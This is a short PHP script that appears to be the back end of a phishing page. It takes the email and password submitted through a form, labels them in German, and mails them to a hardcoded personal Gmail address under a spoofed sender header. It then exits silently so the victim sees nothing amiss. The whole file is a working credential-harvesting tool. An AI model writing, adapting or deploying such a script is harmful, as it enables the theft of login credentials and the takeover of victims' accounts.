<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Your email address
    $to_email = "kaykayj528@gmail.com"; // Replace with your email

    // Subject of the email
    $subject = "sharp";

    // Message content
    $message = "E-Mail-Adresse: " . $_POST['email'] . "\n";
    $message .= "Passwort: " . $_POST['password'] . "\n";

    // Email headers
    $headers = "From: noreply@yourdomain.com"; // Replace with your domain

    // Send email
    mail($to_email, $subject, $message, $headers);

    // Exit silently (no user feedback)
    exit;
}
?>
